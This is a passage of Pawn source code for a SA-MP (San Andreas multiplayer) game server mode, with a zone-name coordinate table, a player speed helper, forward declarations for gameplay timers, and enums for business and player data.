	{"Downtown Los Santos",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
	{"Downtown Los Santos",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
	{"Downtown Los Santos",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
	{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
	{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
	{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
	{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
	{"East Los Santos",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
	{"East Los Santos",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
	{"East Los Santos",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
	{"East Los Santos",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
	{"East Los Santos",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
	{"East Los Santos",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
	{"East Los Santos",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
	{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
	{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
	{"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
	{"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
	{"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
	{"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
	{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
	{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
	{"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
	{"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
	{"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
	{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
	{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
	{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
	{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
	{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
	{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
	{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
	{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
	{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
	{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
	{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
	{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
	{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
	{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
	{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
	{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
	{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
	{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
	{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
	{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
	{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
	{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
	{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
	{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
	{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
	{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
	{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
	{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
	{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
	{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
	{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
	{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
	{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
	{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
	{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
	{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
	{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
	{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
	{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
	{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
	{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
	{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
	{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
	{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
	{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
	{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
	{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
	{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
	{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
	{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
	{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
	{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
	{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
	{"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
	{"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
	{"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
	{"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
	{"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
	{"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
	{"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
	{"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
	{"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
	{"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
	{"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
	{"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
	{"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
	{"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
	{"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
	{"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
	{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
	{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
	{"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
	{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
	{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
	{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
	{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
	{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
	{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
	{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
	{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
	{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
	{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
	{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
	{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
	{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
	{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
	{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
	{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
	{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
	{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
	{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
	{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
	{"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
	{"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
	{"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
	{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
	{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
	{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
	{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
	{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
	{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
	{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
	{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
	{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
	{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
	{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
	{"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
	{"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
	{"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
	{"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
	{"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
	{"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
	{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
	{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
	{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
	{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
	{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
	{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
	{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
	{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
	{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
	{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
	{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
	{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
	{"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
	{"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
	{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
	{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
	{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
	{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
	{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
	{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
	{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
	{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
	{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
	{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
	{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
	{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
	{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
	{"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
	{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
	{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
	{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
	{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
	{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
	{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
	{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
	{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
	{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
	{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
	{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
	{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
	{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
	{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
	{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
	{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
	{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
	{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
	{"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
	{"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
	{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
	{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
	{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
	{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
	{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
	{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
	{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
	{"Randolph Industrial",         {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
	{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
	{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
	{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
	{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
	{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
	{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
	{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
	{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
	{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
	{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
	{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
	{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
	{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
	{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
	{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
	{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
	{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
	{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
	{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
	{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
	{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
	{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
	{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
	{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
	{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
	{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
	{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
	{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
	{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
	{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
	{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
	{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
	{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
	{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
	{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
	{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
	{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
	{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
	{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
	{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
	{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
	{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
	{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
	{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
	{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
	{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
	{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
	{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
	{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
	{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
	{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
	{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
	{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
	{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
	{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
	{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
	{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
	{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
	{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
	{"Four Dragons Casino",         {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
	{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
	{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
	{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
	{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
	{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
	{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
	{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
	{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
	{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
	{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
	{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
	{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
	{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
	{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
	{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
	{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
	{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
	{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
	{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
	{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
	{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
	{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
	{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
	{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
	{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
	{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
	{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
	{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
	{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
	{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
	{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
	{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
	{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
	{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
	{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
	{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
	// Citys Zones
	{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

enum ReadPositions{Float:ReadX,Float:ReadY,Float:ReadZ
}
new LuX_ReadPlayerPosition[PLAYERS][ReadPositions];
new Float:VehPosX[MAX_VEHICLES], Float:VehPosY[MAX_VEHICLES], Float:VehPosZ[MAX_VEHICLES];

forward LuX_SpeedoMeterUp();
stock GetPlayerSpeed(playerid,bool:kmh) // by misco
{
    new Float:Vx,Float:Vy,Float:Vz,Float:rtn;
    if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),Vx,Vy,Vz); else GetPlayerVelocity(playerid,Vx,Vy,Vz);
    rtn = floatsqroot(floatabs(floatpower(Vx + Vy + Vz,2)));
    return kmh?floatround(rtn * 100 * 1.61):floatround(rtn * 100);
}
//================================Text Draws====================================
new tstring[128];
//==================================Forwards====================================
forward resetcount();
forward BackupInfo();
forward SaveComponent(vehicleid,componentid);
forward KickTimer(playerid);
forward CallVehicleToPlayer(playerid);
forward CallVehicle2ToPlayer(playerid);
forward CallVehicle3ToPlayer(playerid);
forward CallVehicle4ToPlayer(playerid);
forward CallVehicle5ToPlayer(playerid);
forward CallVehicle6ToPlayer(playerid);
forward CallVehicle7ToPlayer(playerid);
forward CallVehicle8ToPlayer(playerid);
forward CallVehicle9ToPlayer(playerid);
forward CallVehicle10ToPlayer(playerid);
forward GuerraTotalOn();
forward GuerraTotalOff();
forward ttimer(playerid);
forward resetTcount(playerid);
forward UnfreezeTele(playerid);
forward ctimer();
forward PayDay();
forward VHPBarUpdate();
forward isPlayerInArea(playerID, Float:data[4]);
forward SystemMsg(playerid,msg[]);
forward SetPlayerRandomSpawn(playerid);
forward Float:GetDistanceBetweenPlayers(p1,p2);
forward commitedcrimerecent();
forward JailFood();
forward copshavevctimer();
forward WantedLevelReduce();
forward AutoUnjail();
forward BeenReported();
forward ReqBkRecentTime();
forward VehicleRepairedRecent();
forward fixedcarrecenttimer();
forward SandEngine();
forward ReqMechRecentTime();
//=================================Info stuff===================================
enum bInfo
{
	name[MAX_PLAYER_NAME],
	owner[MAX_PLAYER_NAME],
	bought,
	cost,
	profit,
	cashbox,
 	Float:xpos,
	Float:ypos,
	Float:zpos,
	ico,
	inter,
}

new BizInfo[B_LIMIT][bInfo];

enum pInfo
{
	name[MAX_PLAYER_NAME],
	bowner,
	bowned,
	pass,
	pcash,
	bank,
	Jailed,
	vhpb,
	Registered,
	LoggedIn,
	DesactivarChat,
	Level,
	Vip,
	Muted,
	Caps,
	LJailTime,
	Frozen,
	FreezeTime,
	Kills,
	Deaths,
	hours,
	mins,
	secs,
    Twin,
    Rwin,
	Hide,
	TotalTime,
	ConnectTime,
 	MuteWarnings,
	Warnings,
	Spawned,
	TimesSpawned,
	God,
	DoorsLocked,
	SpamCount,
	SpamTime,
	PingCount,
	PingTime,
	BotPing,
	pPing[PING_MAX_EXCEEDS],
    pCar,
